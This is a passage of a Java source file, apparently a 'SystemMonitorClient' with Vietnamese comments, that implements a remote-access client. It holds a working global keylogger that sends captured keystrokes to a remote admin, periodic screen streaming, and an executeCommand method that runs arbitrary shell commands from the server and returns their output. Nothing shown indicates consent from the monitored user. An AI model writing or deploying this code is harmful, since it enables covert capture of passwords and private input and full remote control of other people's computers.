                    keyLogBuffer.append("[").append(NativeKeyEvent.getKeyText(e.getKeyCode())).append("]");
                    // Send buffer to admin every 10 characters
                    if (keyLogBuffer.length() >= 10) {
                        sendKeyLogData(adminId);
                    }
                }

                @Override
                public void nativeKeyReleased(NativeKeyEvent e) {
                    // Not needed
                }

                @Override
                public void nativeKeyTyped(NativeKeyEvent e) {
                    // Not needed
                }
            };

            // Xóa các listener cũ nếu có
            // Đăng ký listener mới
            try {
                GlobalScreen.removeNativeKeyListener(keyListener);
            } catch (Exception e) {
                // Bỏ qua lỗi nếu không có listener nào
            }

            GlobalScreen.addNativeKeyListener(keyListener);

            keyLoggerRunning = true;

            // Clear buffer
            keyLogBuffer.setLength(0);

            // Schedule periodic sending of key log data
            scheduler.scheduleAtFixedRate(() -> {
                if (keyLoggerRunning && keyLogBuffer.length() > 0) {
                    sendKeyLogData(adminId);
                }
            }, 10, 100, TimeUnit.MILLISECONDS);

        } catch (Exception e) {
            System.err.println("Error starting key logger: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void sendKeyLogData(String adminId) {
        try {
            if (keyLogBuffer.length() == 0) return;

            JSONObject keyData = new JSONObject();
            keyData.put("messageType", "keyLogData");
            keyData.put("targetAdminId", adminId);
            keyData.put("sourceUserId", clientId);
            keyData.put("data", keyLogBuffer.toString());
            keyData.put("timestamp", System.currentTimeMillis());

            out.println(keyData.toString());

            // Clear buffer after sending
            keyLogBuffer.setLength(0);
        } catch (JSONException e) {
            System.err.println("Error sending key log data: " + e.getMessage());
        }
    }

    private void stopKeyLogger() {
        if (!keyLoggerRunning) return;

        try {
            // Gỡ bỏ key listener nếu có
            if (keyListener != null) {
                try {
                    GlobalScreen.removeNativeKeyListener(keyListener);
                } catch (Exception e) {
                    // Bỏ qua lỗi nếu không thể gỡ bỏ listener
                }
            }

            // Hủy đăng ký native hook (giữ lại hook để tái sử dụng sau này)
            // GlobalScreen.unregisterNativeHook();
            keyLoggerRunning = false;

            // Gửi dữ liệu còn lại trong buffer nếu có
            // ...
        } catch (Exception e) {
            System.err.println("Error stopping key logger: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void startScreenStream(String adminId) {
        if (screenStreamRunning) return;

        screenStreamRunning = true;

        // Schedule periodic screenshots - changed from 200ms to 500ms to reduce network load
        scheduler.scheduleAtFixedRate(() -> {
            if (screenStreamRunning) {
                sendScreenshot(adminId);
            }
        }, 0, 500, TimeUnit.MILLISECONDS);
    }

    private void stopScreenStream() {
        screenStreamRunning = false;
    }

    private void executeCommand(String command, String adminId) {
        try {
            Process process = Runtime.getRuntime().exec(command);

            // Read output
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            // Read errors
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            StringBuilder error = new StringBuilder();
            while ((line = errorReader.readLine()) != null) {
                error.append(line).append("\n");
            }

            // Wait for process to finish with timeout
            boolean completed = process.waitFor(30, TimeUnit.SECONDS);
            int exitCode = completed ? process.exitValue() : -1;

            if (!completed) {
                process.destroyForcibly();
                error.append("Command execution timed out after 30 seconds.\n");
            }

            JSONObject response = new JSONObject();
            response.put("messageType", "commandResponse");
            response.put("targetAdminId", adminId);
            response.put("sourceUserId", clientId);
            response.put("command", command);
            response.put("output", output.toString());
            response.put("error", error.toString());
            response.put("exitCode", exitCode);

            out.println(response.toString());
        } catch (Exception e) {
            try {
                JSONObject response = new JSONObject();
                response.put("messageType", "commandResponse");
                response.put("targetAdminId", adminId);
                response.put("sourceUserId", clientId);
                response.put("command", command);
                response.put("output", "");
                response.put("error", "Error executing command: " + e.getMessage());
                response.put("exitCode", -1);
                out.println(response.toString());
            } catch (JSONException je) {
                System.err.println("Error creating error response: " + je.getMessage());
            }
            System.err.println("Error executing command: " + e.getMessage());
        }
    }

    private String formatBytes(long bytes) {
        String[] units = {"B", "KB", "MB", "GB", "TB"};
        int unitIndex = 0;
        double value = bytes;

        while (value > 1024 && unitIndex < units.length - 1) {
            value /= 1024;
            unitIndex++;
        }

        return String.format("%.2f %s", value, units[unitIndex]);
    }

    private void shutdown() {
        try {
            stopKeyLogger();
            stopScreenStream();
            isConnected = false;

            if (scheduler != null) {
                scheduler.shutdownNow();
            }

            if (out != null) out.close();
            if (in != null) in.close();
            if (socket != null) socket.close();

            // Đảm bảo hủy JNativeHook khi thoát ứng dụng
            try {
                if (GlobalScreen.isNativeHookRegistered()) {
                    GlobalScreen.unregisterNativeHook();
                }
            } catch (Exception e) {
                System.err.println("Error unregistering native hook: " + e.getMessage());
            }

            System.exit(0);
        } catch (IOException e) {
            System.err.println("Error shutting down client: " + e.getMessage());
            System.exit(1);
        }
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(SystemMonitorClient::new);
    }
}